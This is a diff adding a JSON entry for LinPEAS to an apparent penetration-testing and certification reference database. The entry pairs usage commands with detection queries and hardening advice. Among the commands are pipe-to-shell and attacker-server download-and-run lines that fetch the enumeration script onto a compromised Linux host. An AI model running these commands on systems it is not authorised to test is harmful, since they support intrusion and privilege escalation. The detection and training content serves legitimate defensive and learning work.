@@ -1,0 +1,106 @@
+{
+  "id": "linux-linpeas",
+  "name": "LinPEAS - Linux Privilege Escalation Enumeration",
+  "command": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+  "description": "LinPEAS is the de-facto Linux privilege escalation enumeration script. It automatically audits the host for hundreds of privesc vectors - SUID/SGID binaries, sudo rules, capabilities, cron jobs, writable files, kernel exploits, credentials in files, container escapes, and more - and color-codes findings by likelihood (red/yellow = probably exploitable). First tool to run after landing a Linux shell.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Post-Exploitation",
+  "subcategory": "Privilege Escalation",
+  "certifications": [
+    "OSCP",
+    "CPTS"
+  ],
+  "primary_cert": "OSCP",
+  "source": "peass-ng/PEASS-ng",
+  "tags": [
+    "linpeas",
+    "privesc",
+    "enumeration",
+    "peass",
+    "suid",
+    "sudo",
+    "linux",
+    "automation"
+  ],
+  "mitre": [
+    "T1082",
+    "T1083"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== RUN FROM MEMORY (no disk write) ===\n  curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh\n  wget -q https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -O- | sh\n\n=== TRANSFER + RUN (no egress) ===\n  # Attacker:\n  python3 -m http.server 80\n  # Target:\n  wget http://<lhost>/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh\n\n=== USEFUL OPTIONS ===\n  ./linpeas.sh -a            # all checks (thorough, slower)\n  ./linpeas.sh -s            # stealth/superfast (fewer, quieter checks)\n  ./linpeas.sh -e            # extra/deep enumeration\n  ./linpeas.sh -o SysI,Devs  # only specific check groups\n  ./linpeas.sh | tee linpeas_out.txt   # keep output\n\n=== SAVE COLOR OUTPUT TO VIEW LATER ===\n  ./linpeas.sh -a > linpeas.txt 2>&1\n  less -r linpeas.txt   # preserve ANSI colors\n\n=== READING RESULTS ===\n  # RED/YELLOW highlight = 95% likely a privesc vector\n  # RED = almost certainly exploitable\n  # Focus on: SUID, sudo -l, capabilities, cron, writable service files, creds\n\n=== ALTERNATIVES / COMPLEMENTS ===\n  linux-exploit-suggester.sh   # kernel CVE matching\n  pspy                          # watch cron/process activity live\n  LinEnum.sh, lse.sh            # lighter scripts\n  # Always verify LinPEAS findings manually",
+  "examples": [
+    {
+      "label": "Run from memory (fileless)",
+      "command": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"
+    },
+    {
+      "label": "Transfer and run thorough",
+      "command": "wget http://10.10.14.5/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh -a | tee lp.txt"
+    },
+    {
+      "label": "Stealth mode",
+      "command": "./linpeas.sh -s"
+    }
+  ],
+  "references": [
+    {
+      "title": "PEASS-ng",
+      "url": "https://github.com/peass-ng/PEASS-ng"
+    },
+    {
+      "title": "MITRE T1082 - System Information Discovery",
+      "url": "https://attack.mitre.org/techniques/T1082/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "linux-exploit-suggester",
+      "note": "Match kernel version to public exploits after LinPEAS.",
+      "rel": "next"
+    },
+    {
+      "id": "find-suid-sgid",
+      "note": "Manually exploit SUID/SGID binaries LinPEAS flags.",
+      "rel": "next"
+    },
+    {
+      "id": "linux-pspy",
+      "note": "Watch cron/process activity LinPEAS hints at.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "LinPEAS reads world-readable system state (binaries, config, process list, cron, sudo rules) that any user can enumerate. It is loud but uses only normal read operations, so it rarely errors out.",
+    "prerequisites": "Any shell on the target (even low-priv); a shell interpreter.",
+    "impact": "Rapid, comprehensive mapping of every local privilege-escalation vector.",
+    "detection": "[MITRE T1082/T1083] Burst of enumeration commands (id, sudo -l, uname, find / -perm, cat of many config files) in seconds; download of linpeas.sh; large sequential file reads.",
+    "artifacts": "linpeas.sh on disk or in bash history; auditd execve spikes; process spawning hundreds of child commands rapidly.",
+    "splunk_spl": "index=linux (process_name IN (\"find\",\"sudo\",\"uname\",\"getcap\") OR CommandLine=\"*linpeas*\")\n| bin _time span=1m\n| stats count by host, user\n| where count > 50",
+    "elastic_kql": "process.command_line:*linpeas* or process.name:(\"find\" and \"getcap\")",
+    "sentinel_kql": "let win=1m;\nSyslog\n| where SyslogMessage has \"linpeas\" or SyslogMessage has_any (\"sudo -l\",\"getcap -r\")\n| summarize count() by Computer, bin(TimeGenerated, win)",
+    "sigma_rules": "lnx_privesc_enumeration_linpeas",
+    "prevention": "Harden the host so enumeration yields nothing (no exploitable SUID, least-privilege sudo, patched kernel, no creds in files); auditd alerting on mass enumeration; EDR on Linux; minimal toolchain on servers.",
+    "sources": [
+      "PEASS-ng",
+      "https://attack.mitre.org/techniques/T1082/"
+    ],
+    "detections": [
+      {
+        "platform": "elastic",
+        "name": "Mass local enumeration (LinPEAS-style)",
+        "logic": "process.name:(\"find\" or \"getcap\" or \"sudo\" or \"uname\") and event.action:\"exec\"",
+        "data_source": "linux-audit",
+        "attack": [
+          "T1082",
+          "T1083"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "false_positives": "Admin troubleshooting, config-management agents (Ansible/Puppet)",
+        "tuning": "Correlate many enumeration execs from one PID/session in a short window; exclude known automation accounts"
+      }
+    ]
+  }
+}
